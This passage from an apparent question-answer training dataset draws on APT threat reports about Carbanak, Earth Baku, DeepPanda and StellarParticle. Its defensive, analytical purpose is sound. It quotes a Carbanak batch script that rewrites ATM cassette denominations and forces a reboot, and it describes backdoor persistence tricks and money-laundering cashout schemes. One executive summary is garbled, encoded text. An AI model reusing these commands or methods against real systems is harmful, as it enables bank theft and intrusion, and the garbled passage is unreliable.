banner:\n$ telnet 178.32.75.193 587\nTrying 178.32.75.193...\nConnected to 178.32.75.193.\nEscape character is '^]'.\n220 transformer13_appin ESMTP Exim 4.80.1 Sat, 23 Mar 2013 20:36:34 +0300\nOther interesting indicators were found when we examined the domain softservices.org; a domain which has held several of the known malicious IP addresses used by this group (46.182.104.83, 94.185.81.153, 89.207.135.242). However, even if the domain was obviously connected, we could find no malware that used it. Instead, we found this forum post on the Nokia developer forum:\nThe interesting bit was found further down this thread, where the developer posted a snippet of source code:\nThis piece of code appears used for uploading mobile data like IMEI number to softservices.org.\nWe then found the apparent developer's profile on Elance, an online employment service for freelance programmers.\nThe developer's CV on Elance (name redacted).\nBased on this we suspect that there are or have been projects to develop mobile malware by this group, even if we have not found any related mobile malware in our databases.\n\nBased on the above text, answer a question. Why might the frequent appearance of the word 'Appin' in various contexts, including debug paths inside malware files, be significant in understanding the infrastructure behind the APT? How does this relate to the concept of attribution in cybersecurity?",
    "output": "The frequent appearance of the word 'Appin' in various contexts, including debug paths inside malware files, suggests a potential link to the Indian security company called Appin Security Group. This could indicate that either someone is trying to frame Appin, a rogue agent within the company is involved, or there are other explanations. Attribution in cybersecurity involves identifying the entity responsible for an attack, which is crucial for understanding the motives and capabilities of the adversary. The presence of specific strings like 'Appin', 'AppinSecurityGroup', and 'Matrix' in executables can serve as indicators of attribution, although they must be carefully analyzed as anyone can add or change such text strings.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nLate last year, we discovered a new shellcode loader designed to execute an arbitrary shellcode with a stealth mode feature. Since then, we have found multiple variants of this loader, which we have named StealthVector, and, in addition, a shellcode loader written in C#, which we have named StealthMutant. These shellcode loaders have two different payloads: the Cobalt Strike beacon and a newly found modular backdoor, which we have dubbed ScrambleCross.\nBased on their indicators, we have concluded that the threat actors behind this campaign are linked to Earth Baku, an APT group that also goes by the name APT41. Earth Baku, a cyberespionage and cybercriminal group, was charged by the US Department of Justice in August 2020 with computer intrusion offenses related to data theft, ransomware, and cryptocurrency mining attacks.5\nEarth Baku's new campaign, which has been active since at least July 2020, is related to a previous one reported by Positive Technologies6 and FireEye,7 which had used a different shellcode loader, which we had named LavagokLdr, as shown in Figure 1. However, since the group has fully updated its toolset, we recognize this attack as an entirely new campaign.\nThis campaign affects some Indo-Pacific countries, including India, Indonesia, Malaysia, the Philippines, Taiwan, and Vietnam, as illustrated in Figure 2. It targets both enterprises and government entities, including organizations in the airline, computer hardware, automotive, infrastructure, publishing, media, and IT industries. From a geopolitical point of view, many of the countries affected by this recent campaign overlap with those reported in the aforementioned indictment of Earth Baku by the US.\nSource: Trend Micro\u2122 Smart Protection Network\u2122 infrastructure\n\nHow does the use of multiple shellcode loaders, such as StealthVector and StealthMutant, enhance the capabilities of the Earth Baku APT group? Why might they choose to develop and deploy these specific tools in their campaigns?",
    "output": "The use of multiple shellcode loaders, such as StealthVector and StealthMutant, enhances the capabilities of the Earth Baku APT group by providing them with versatile and stealthy methods to execute arbitrary shellcode. StealthVector, for instance, includes a stealth mode feature that allows it to operate undetected, while StealthMutant, being written in C#, offers cross-platform compatibility and potentially easier integration into .NET environments. By developing and deploying these specific tools, Earth Baku can adapt to different target environments and evade detection mechanisms more effectively. This strategy aligns with their goal of conducting sophisticated cyberespionage and cybercriminal activities, as seen in their campaign affecting various Indo-Pacific countries and targeting both enterprises and government entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Operation Poisoned Handover: Unveiling Ties Between APT Activity in Hong Kong's Pro-Democracy Movement\nAs the pro-democracy movement in Hong Kong has continued, we've been watching for indications of confrontation taking place in cyberspace. Protests began in September and have continued to escalate.\nIn recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against websites promoting democracy in Hong Kong. According to the Wall Street Journal, websites belonging to Next Media's Apple Daily publication have suffered from an ongoing DDoS attack that \"brought down its email system for hours\". According to other reports, Next Media's network has suffered a \"total failure\" as a result of these attacks. Additionally, at least one member of the popular online forum HKGolden was arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement.\nThe use of DDoS attacks as a political tool during times of conflict is not new; patriotic hacktivist groups frequently use them as a means to stifle political activity of which they disapprove. The question of state sponsorship (or at least tacit approval) in online crackdowns is often up for debate and ambiguous from a technical evidence and tradecraft perspective.\nIn this case, however, we've discovered an overlap in the tools and infrastructure used by China-based advanced persistent threat (APT) actors and the DDoS attack activity. We believe that these DDoS attacks are linked to previously observed APT activity, including Operation Poisoned Hurricane. This correlation sheds light on the potential relationships, symbiosis and tool sharing between patriotic hacker activities designed to disrupt anti-government activists in China, and the APT activity we consistently see that is more IP theft and espionage-focused.\n\nHow does the overlap in tools and infrastructure between China-based APT actors and DDoS attack activity in Hong Kong's pro-democracy movement indicate a potential relationship between patriotic hacker activities and traditional APT operations?",
    "output": "A: The overlap in tools and infrastructure used by China-based advanced persistent threat (APT) actors and the DDoS attack activity suggests a link between these two types of operations. Specifically, the correlation between the DDoS attacks targeting pro-democracy websites in Hong Kong and previously observed APT activity, such as Operation Poisoned Hurricane, indicates a potential symbiotic relationship. This overlap sheds light on how patriotic hacker activities aimed at disrupting anti-government activists in China might share resources and tactics with more traditional APT activities focused on IP theft and espionage. This finding highlights the complexity and interconnectedness of different types of cyber threats, suggesting that state-sponsored or approved activities may encompass both disruptive hacktivism and strategic espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Section Summary:\nThe Derusbi / Sakula malware implant types are unique in that they have traditionally been seen within Chinese APT espionage campaigns.\nThe \"HttpBrowser\" / \"HttpDump\" malware implant (while a different family of malware than Derusbi / Sakula) is also believed to be of Chinese origin, and was also digitally signed with the DTOPTOOLZ digitalsignature. This implant connected to a C2 node that overlapped with prennera[.]com.\nWe believe that the prennera[.]com domain may be impersonating Premera Blue Cross (premera.com), using a similar character replacement technique seen in the we11point[.]com campaign.\n\nHow does the use of the 'HttpBrowser' / 'HttpDump' malware implant in the Anthem hack suggest a connection to Chinese APT groups, and what techniques were employed to obscure its origins?",
    "output": "The 'HttpBrowser' / 'HttpDump' malware implant is believed to be of Chinese origin and was digitally signed with the DTOPTOOLZ digital signature. This implant connected to a command and control (C2) node that overlapped with the domain prennera[.]com. This domain is suspected of impersonating Premera Blue Cross (premera.com) by using a similar character replacement technique seen in the we11point[.]com campaign. The use of this specific malware family and the domain impersonation technique suggests a connection to Chinese APT groups, as these methods have been traditionally associated with Chinese espionage campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The malicious script contains the following commands:\nContents of the file \"1.bat\"\nrEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_1 /t rEG_sZ /d \"5000\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_2 /t rEG_sZ /d \"1000\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_3 /t rEG_sZ /d \"500\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_4 /t rEG_sZ /d \"100\" /f\nrEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_1 /t rEG_sZ /d \"100\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_4 /t rEG_sZ /d \"5000\" /f\nshutdown -r -t 0 \u2013f\nFigure. Service program KDIAG32 for Wincor ATMs\nExecution of this file changed registry keys in the registry branch \"\"HKEY_LOCAL_MACHINE\\ SOFTWARE\\Wincor Nixdorf\\ProTopas\\Current-Version\\LYNXPAR\\CASH_DISPENSER\"\" that are responsible for cassette denominations in an ATM. As a result of this file execution the registry key that is in charge of the cassette number 1 (VALUE_1) is takes the value \"100\", and the registry key responsible for the cassette number 4 (VALUE_4) is set to \"5000\". Then the command to restart the computer is issued. The registry key reference values:\nIf the ATM actual load corresponds to the reference one and registry keys have been changed, then the banknotes from the cassette No.1 will be issued with denomination \"5000\" instead of \"100\".\nMedium Headline: withdrawal of all cash from dispenser\nIn addition, the attackers used a modified debug\nprogram that allows by the command to issue money from the dispenser. The original debug program issues money through the dispenser only when the open ATM housing and the vault door are fixed.\nIn order to ensure money issuance from the closed ATM the attackers had to modify the original program \"KDIAG32\" (the original file: size of 1,128,960 MD5 4CC1A6E049942EBDA395244C74179EFF).\nA comparison of the original version of the program with the modified version showed that the only difference is in ignoring error \"\"Door not opened or missing!\"\". The figure below shows an error message that will be never displayed to the user in the file under investigation.\nBig Headline: AnDromeDA usAge\nAll traces found during investigation of one incident showed that the same criminal group had worked. Ammy Admin was used for remote access, the same\nSSHD backdoor was installed on Unix servers and, In addition, it was loaded from the same hacked server as in other cases of trojan Anunak usage. However, in this case Andromeda is used as the main trojan instead of Anunak. The management servers were located in Kazakhstan, Germany and Ukraine. Check of the management servers showed that it was the hosting Bulletproof that, in addition to servers, provides a service of traffic proxying through its infrastructure as well as TOR and VPN usage, so this pattern is significantly differs from the Anunak hosting patern. Check of money cashout showed that the same cashout criminal group had worked as for Anunak and this fact again confirmed their cooperation.\nObtained Andromeda trojan copies were being distributed from August 2014 by e-mail. The value 754037e7be8f61cbb1b85ab46c7da77d, which is the MD5 hash of the string \"go fuck yourself\", was used as the RC4 encryption key. As a result of this distribution from August to late October the Andromeda botnet rose up to 260,000 bots. Successful infection in one subnet resulted in sending such letters to other bank employees. Example of forwarding from an infected bank network to employees of another bank is shown below.\nAs a result of this radial mailing many oil and gas companies, banks and government agencies were infected. In Russia at least 15 banks and two payment systems were infected this way.\nLetters with similar attachments were being distributed with the following subjects:\n\"My new photo\"\n\"Alert Transactions Report by users from 2014-09-28 to 2014-09-28\"\nBig Headline: cAshouT schemAs\nPreviously, it should be noted the fact that the process of stolen money withdrawal (cashout) was differed, firstly by the theft method, secondly by the\nvictim type (a bank or a payment system), thirdly by the total stolen sum.\nThe victims by their type were divided rather by counterparty types and by limitations imposed by operation with the counterparties. For example, all payments were required to go through a certain pool of mediators. In addition, the \"improper\" pool of counterparties could cause suspicion and unnecessary testing (manual processing of payment orders).\nBank (amounts up to 100 million roubles):\n\u2022 When the attackers had obtained control of a bank operator workstation (attacker purpose), they in general used a classic tree scheme when funds from the bank account were sent to several legal entities, then from each legal entity to smaller legal entities (may be several such iterations) and then to private person credit cards (from 600 to 7000 transactions).\n\u2022 When the attackers had obtained control of ATM management service (attacker purpose), money were withdrawn directly from the ATM by the attacker command. In this case the whole cashout process consisted in that a drop person had to be near the ATM at the specified time with a bag to empty the dispenser.\nBank (amounts from 100 million roubles):\n\u2022 Money was sent to accounts of other banks, and cracked banks were often used where accounts and credit cards had been prepared in advance.\nPayment system:\n\u2022 In addition to all the above methods, cash sending channels were also employed through the settlements systems, electronic wallets and payment systems, such as web money, Yandex\nMoney, QIWI (1500-2000 transactions). Revenues of large amounts (up to 50 million roubles) were recorded to particular cards of private persons who then used these cards to buy expensive small-sized goods such as jewelry, watches, and other attributes. A huge part of the money was sent through mobile operators (1500-2000 SIM cards prepared in advance).\n\u2022 In spring 2014 (high time of this fraud type) 2 cashout person groups were known who supported target attacks, by autumn 2014 their number\nincreased to 5. In general, this increase was due to number of thefts too (number of victims + average stolen sum per 1 victim). The groups are working in different cities to ensure better cashout distribution. Also these groups include immigrants from former Soviet republics who if necessary arrive in the required city. Each group was monitored by a separate person. Each group consists of about 15-20 people.\n\u2022 Part of the money was transferred to Ukraine and Belarus.\nBig Headline: ATTAcks in euroPe AnD usA\nWhile the attacks in Russia against banks and payment systems have occurred over the past two years, the attacks against the retail industry is only something which started in the second quarter of 2014. With at least three confirmed breaches where card track data was obtainedand a total of at least 16 breaches at retail organizations, it is also becoming a serious threat.\nApart from retail organizations it is also known that a number of media and PR companies have been breached in 2014. While it is not entirely certain, the type of breaches suggest that the attackers are looking for inside information, a type of industrial espionage, allowing them to gain an advantage on the stock market. As there is nothing specifically missing and the resulting fraud is hard to match with anything, these incidents typically are never linked.\nMedium Headline: infection methods\nFrom the retail perspective, the first infections in 2014 were sourced from a botnet which employs a widely deployed crypto-currency mining malware based on the Gozi/ISFB (banking) malware family. Based on our insights we believe during the first half of 2014 over half a million systems had been compromised by this malware from over the whole world, however Russia and a number of post-Soviet states were clean of infections. To find interesting infections within this large set of compromised systems, the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/ Windows domain information.\nThe Gozi/ISFB based malware was used to drop additional components on interesting systems, which included Metasploit/Meterpreter payloads\nand Anunak variants. This was one of the main methods for the group using Anunak to obtain interesting infections in the middle of 2014, sourcing infections from other botnet operators.More recently other infection methods, including spear phishing using English language and possibly also usage of the teams own Andromeda, but also SQL injection to breach an organization directly from the outside, has been employed by this team.\nMedium Headline: pos compromises\nThe first known attacks with Anunak targeted a specific brand of POS systems which revolved around the Epicor/NSB brand. To do this Anunak has specific code to target POS devices equipped with this software, which in contrary to the more common memory scanning track data scrapers, logs a wealth of information from the payments done by the cards. The first case this was seen active was in July 2014, but it might have been earlier as well.\nMore recent breaches have used a new custom developed POS malware, which is a more simple but reliable track data memory scraper. The initial version from the early fall of 2014 used a simple blacklist, scraped every process and dumped track data in plain text. More recent versions scanned only configuration specified processes and used RC4 to encrypt the extracted track data records on disk.\nQuestion: What modifications were made to the original debug program 'KDIAG32' to enable money issuance from a closed ATM, and how did this modification facilitate the attack?",
    "output": "Answer: The original debug program 'KDIAG32' was modified to ignore the error 'Door not opened or missing!', which normally prevents money from being issued unless the ATM housing and vault door are open. By removing this restriction, the attackers ensured that money could be issued from the ATM even when it was closed. This modification facilitated the attack by allowing the attackers to command the ATM to dispense cash without physically opening it, making the theft more discreet and efficient.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What was the significance of the shift from Excel to Word documents in the BlackEnergy attacks, and how was the new document crafted to entice users to enable macros?",
    "output": "The shift from Excel to Word documents in the BlackEnergy attacks signified an evolution in the group's tactics to stay ahead of detection mechanisms. The new document, named '$RR143TB.doc', was designed to appear legitimate and relevant to Ukrainian users. It included a lure mentioning 'Pravii Sektor' (Right Sector), a nationalist party in Ukraine, to increase the likelihood that users would enable macros. This document was first noticed in January 2016, despite having been created in July 2015, indicating a possible delay in detection by victims.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: EXECUTIVE SUMMARY\n,Q\ue003ODWH\ue003'HFHPEHU\ue003\ue015\ue013\ue014\ue014\ue00f\ue003&URZG6WULNH\ue00f\ue003,QF\ue011\ue003UHFHLYHG\ue003WKUHH\ue003ELQDU\\\ue003H[HFXWDEOH\ue003\u00bfOHV\ue003WKDW\ue003ZHUH\ue003VXVSHFWHG\ue003RI\ue003 KDYLQJ\ue003EHHQ\ue003LQYROYHG\ue003LQ\ue003D\ue003VRSKLVWLFDWHG\ue003DWWDFN\ue003DJDLQVW\ue003D\ue003ODUJH\ue003)RUWXQH\ue003\ue018\ue013\ue013\ue003FRPSDQ\\\ue011\ue003\ue0037KH\ue003\u00bfOHV\ue003ZHUH\ue003 DQDO\\]HG\ue003WR\ue003XQGHUVWDQG\ue003\u00bfUVW\ue003LI\ue003WKH\\\ue003ZHUH\ue003LQ\ue003IDFW\ue003PDOLFLRXV\ue00f\ue003DQG\ue003WKH\ue003OHYHO\ue003RI\ue003VRSKLVWLFDWLRQ\ue003RI\ue003WKH\ue003VDPSOHV\ue011\ue003\ue003\nThe samples were clearly malicious and varied in sophistication.   All three samples provided remote access to the attacker, via two Command and Control (C2) servers.  One sample is typical of what is commonly referred to as a 'dropper' because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system.  The malicious component in this case is what is commonly referred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed as a service.  The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor.  The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools.  This third component is likely used for long-term implantation and intelligence gathering.  Some AV engines occasionally identify this sample as Derusbi Trojan.  CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT, including 64-bit versions, used in targeted attacks in 2011 against Defense, Energy/Power, and Chemical Industries in US and Japan.\n$OO\ue003RI\ue003WKHVH\ue003VDPSOHV\ue003UH\u00c0HFW\ue003FRPPRQ\ue003WRROPDUNV\ue003DQG\ue003WUDGHFUDIW\ue003FRQVLVWHQW\ue003ZLWK\ue003&KLQHVH\ue003EDVHG\ue003DFWRUV\ue003ZKR\ue003 target various strategic interests of the United States including High Tech/Heavy Industry, Non-Governmental Organizations (NGOs), State/Federal Government, Defense Industrial Base (DIB), and organizations with vast economic interests.  This report contains an in-depth technical analysis of the samples, detection/remediation/mitigation information, attribution intelligence, and a conclusion aimed at providing the reader with a synopsis of the report.\n\nBased on the above text, answer a question. How does DeepPanda utilize different types of malware components to achieve its objectives? Explain the roles of each component and how they contribute to the overall attack strategy.",
    "output": "DeepPanda utilizes three distinct malware components to achieve its objectives. The first component is a 'dropper,' which writes a malicious component to disk and connects it to the targeted host's operating system. This component installs a Remote Access Tool (RAT) manifested as a Dynamic Link Library (DLL) service, providing the attacker with remote access. The second component is a dual-use tool that functions as a post-exploitation tool, capable of infecting other systems, downloading additional tools, removing log data, and acting as a backdoor. The third component is a sophisticated implant with multiple communication capabilities and the ability to act as a relay for other infected hosts. It uses a kernel-mode driver to hide aspects of the tool from user-mode tools, making it suitable for long-term implantation and intelligence gathering. This third component is sometimes identified as the Derusbi Trojan by some antivirus engines.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: The Requirements\nWe should never think of Chinese cyber attacks as uncoordinated, random or indiscriminate. They target companies, governments or individuals because a specific requirement has been identified. Context has studied a number of Chinese government policies, documents and stated aspirations, as well as Chinese commercial structures, which may show why targets may have been picked; and may also help companies to gauge whether their business should consider itself to be at risk of being targeted by a Chinese attacker.\nThe key documents are the Five Year Plan and the National Outline for Medium and Long Term S&T Development. We will also theorise around the (unwritten) intelligence requirements. We will then later investigate China's state-owned enterprises as potential generators of requests for material to be stolen via targeted attacks; and as consumers of stolen data.\nThe Five Year Plan is a series of development initiatives, both social and economic, that set high level goals for where the Communist Party would like to see the country in five years' time. The latest Plan was finalised in October 2010 and applies to the period 2011 \u2013 2015. It contains goals for urbanisation rates and targets for economic growth; details the foreign industries that will be invited to do business in China, the scale of proposed construction projects and areas of the country/economy where further development should be encouraged. These high level goals filter down to all government departments at national, regional and local level, where individual initiatives are managed. But the plan also hints at the areas where China feels it needs to concentrate its efforts, or where it needs to catch up with other countries elsewhere in the world.\nHowever, targeted attacks are 'state sponsored', which means that it is not the government that conducts the attack, but departments of the state or affiliated groups. When the government decides that, for example, it requires intelligence relating to US military operations in Afghanistan, different parts of the state intelligence apparatus will respond to this requirement, each bringing different skill sets to bear on the problem of finding the required information. For example, the People's Liberation Army (PLA) has departments with access to satellite photography, which could provide information on troop movements. Another department may have access to Signals Intelligence (SIGINT), which intercepts communications. Chinese diplomats in the country will speak with their Afghan counterparts about the situation, while intelligence officers, perhaps in diplomatic or even non-official roles, are able to exploit human agents with access to useful reporting. To complement all of these sources, cyber attacks can be used against a variety of targets such as the Pentagon, military forces in theatre, the US embassy, defence contractors and representatives of the UN and NATO. As cyber proves its worth (if it hasn't already) other parts of the government will seek to develop their own cyber capability to add to their existing capabilities, not wishing to be outshone by competing departments.\nOne of the points on the Five Year Plan for instance is 'More efficient development of nuclear power under the precondition of ensured safety', which could suggest that any information gathering attacks against the nuclear energy industry (as opposed to sabotage\nor Stuxnet12 style attacks) could be carried out with the express intention of supporting this part of the Plan.\nThe attacks could be directed against nuclear plants themselves in an attempt to obtain operating information; construction companies, to steal building plans (which may also be of value to the military in case of war); regulatory bodies for rules, policies and procedures; and any of the hundreds of companies that build parts for the plant or develop technology used in the nuclear process.\nIn terms of who could be carrying out the attacks, we have to consider not only the military (the Third Department of the PLA has the remit for cyber operations, though other areas are likely to have some capability too), but also nuclear construction companies, the government department with a remit for the energy industry, or any of the hacking groups that are closely affiliated to the state. Different campaigns may even be competing to steal the same information with the rewards going to the attackers who get it first.\nThe Plan also advocates the development of high-end manufacturing, hi-tech industry, modern agriculture, high-speed rail and hydropower. The Plan does not explain in any detail how this development will be achieved, although in some cases it does specify that certain areas will be prioritised for direct foreign investment. In these cases, foreign firms are invited to partner with local firms to complete a project and engage in 'technology transfer'. This means (officially) that the Chinese company will learn skills from the foreign company and develop their own capabilities in the area. Unofficially, it generally ends up with the foreign company having its IP and technology stolen and then finding that it no longer has an invitation to do business in the country.\nOne good example of technology transfer can be seen in the area of high speed railways. Originally, trains were purchased from Kawasaki, Siemens and Bombardier and these manufacturers helped create the first high speed lines which opened in 2007. Soon afterwards China started to build its own high speed trains, modelled on those imported, but with reconfigured components. There is an ongoing legal case brought by Kawasaki and other Japanese companies relating to Chinese companies attempting to patent Kawasaki technology associated with high speed rail13 . The current Chinese patent laws specify that the owner of a patent registered in China must be Chinese and that the Chinese holder will also be favoured over any foreign claim for the same technology.\nIn July 2011 two high speed trains collided near Wenzhou, killing (according to state media) 40 people. There were concerns that the trains contained stolen foreign technology and it has been suggested that this is why the wreckage was buried even before the rescue operation had been completed. It has also been suggested in certain quarters that burying the wreckage stopped any investigation by the manufacturers into what went wrong (and whether or not there was stolen technology present). This action attracted widespread criticism of the government, even from some sources within China.\n12\n13\n\nWhy might different departments within the Chinese government compete to develop their own cyber capabilities, and how does this competition impact the overall strategy of targeted attacks?",
    "output": "Different departments within the Chinese government may compete to develop their own cyber capabilities to avoid being outshone by other departments and to prove the worth of cyber attacks as a means of gathering intelligence. For example, the People's Liberation Army (PLA) has departments with access to satellite photography and signals intelligence, while other departments may use human agents or cyber attacks. This competition can lead to multiple campaigns targeting the same information, with rewards going to the attackers who obtain it first. This dynamic can intensify the overall effort and sophistication of targeted attacks, as each department strives to demonstrate its effectiveness.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Geographical Distribution\nKnown samples of Carbanak have been uploaded to VirusTotal from the following locations:\nKnown exploits that download Carbanak have been uploaded to VirusTotal mostly from Russia.\nAccording to KSN data, victims are distributed geographically as follows:\nThe analyzed Carbanak samples, excluding some obvious outliers, have the following compilation time distribution:\nIt is also very interesting to see the distribution of Carbanak submissions to VirusTotal. This way we can identify periods when the malware came to the attention of potential victims and security researchers, and helps to reveal peaks in the group's activity:\nSince the beginning of this case, Kaspersky Lab has worked in cooperation with the LEAs investigating it. During the investigation LEAs shared with us statistical data from their research that helped us to complete our picture of the campaign.\nThe following map shows targets' IP addresses found in three of Carbanak's Linux servers at the end of October 2014:\nMedium Headline: 2.3 Lateral movement tools\nCarbanak uses different tools on infected systems, each one with a different purpose. There appears to be a preference for the Ammyy Admin remote administration tool for remote control. Specifically, the attackers have been detected uploading:\nAmmyy Admin 3.5 (f8cd52b70a11a1fb3f29c6f89ff971ec) as svchost.exe\nIt is believed that the attackers used this remote administration tool because it is commonly whitelisted in the victims' environments as a result of being used regularly by administrators.\nIn another instance, a Secure Shell (SSH) backdoor was used to communicate with the C2 server in 190.97.165.126 (operatemesscont.net).\nThis indicates that the attackers did not limit themselves to Microsoft Windows environments. In this case, the victim used the Telnet/SSH client PuTTY to connect to the server, and the attackers recompiled the machine's SSH daemon with a backdoor so they could gain direct access.\nLogs for these tools indicate that they were accessed from two different IPs, probably used by the attackers, and located in Ukraine and France.\nWe have also found traces of many different tools used by the attackers inside the victim\u00b4s network to gain control of additional systems, such as Metasploit, PsExec or Mimikatz.\nQuestion: What strategies does the Carbanak APT employ to ensure persistent access to compromised systems across different operating environments?",
    "output": "Answer: The Carbanak APT employs several strategies to maintain persistent access to compromised systems across different operating environments. They show a preference for the Ammyy Admin remote administration tool, which is commonly whitelisted in victims' environments, allowing them to remain undetected. Additionally, they have been observed using a Secure Shell (SSH) backdoor to communicate with a C2 server, indicating that they do not limit themselves to Microsoft Windows environments. By recompiling the SSH daemon with a backdoor, they ensure direct access to the compromised systems. Logs for these tools indicate access from different IPs located in Ukraine and France, suggesting a distributed approach to maintaining control.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: User Access Logging (UAL)\nThe Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases. In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant.\nThe UAL database is available by default on Server editions of Windows starting with Server 2012. This database stores historical information on user access to various services (or in Windows parlance, Roles) on the server for up to three years (three years minus one day) by default. UAL contains information on the type of service accessed, the user that accessed the service and the source IP address from which the access occurred. One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful. An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found .\nIn multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data. Even though it's only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system. For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.\nThis allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior. Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.\nSmall Headline: TrailBlazer\nAttempted to blend in with a file name that matched the system name it resided on\nConfigured for WMI persistence (generally uncommon in 2019)\nUsed likely compromised infrastructure for C2\nMasquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests\nTrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence. The malware shares high-level functionality with other malware families. In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST. TrailBlazer persists on a compromised host using WMI event subscriptions4  \u2014 a technique also used by  \u2014 although this persistence mechanism is not exclusive to COZY BEAR.5\nIn the obfuscated example above, TrailBlazer ( <FILENAME> .exe ) would be executed when the system's uptime was between 180 and 480 seconds.\nSmall Headline: GoldMax (Linux variant)\nAttempted to blend in with a file name that matched the system name it resided on\nConfigured for persistence via a crontab entry with a @reboot line\nUsed likely compromised infrastructure for C2\nGoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks. Previously identified samples of GoldMax were built for the Windows platform, with the earliest identified timestamp indicating a compilation in May 2020, but a recent CrowdStrike investigation discovered a GoldMax variant built for the Linux\nplatform that the threat actor deployed in mid-2019. This variant extends the backdoor's known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows.\nThe 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant. The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections. It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality.\nPersistence was established via a crontab entry for a non-root user. With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot. Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.\nBig Headline: Enumeration Tools/Unique Directory Structure\nThroughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit. While the script's contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.\nIn each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool. After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims' various domains. In addition, the randomly named directories are typically created in a previously existing directory that's one level off of the root of the C drive. The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters. To date, the names of the directories have always been formed from lowercase alphanumeric characters. For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where \"XX\" is a previously existing directory on the system):\nC:\\XX\\[a-z0-9]{6}\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain.FQDN\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain-2.FQDN\nIn each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories. This evidence typically came from a UserAssist entry for wscript.exe, as well as RecentApps entries for wscript.exe (that would also include the VBScript filename). In addition, the Jump List for wscript.exe contained evidence of the VBScript files. The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in. Two examples are env.vbs and WinNet.vbs . Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary.\nBig Headline: Internal Wiki 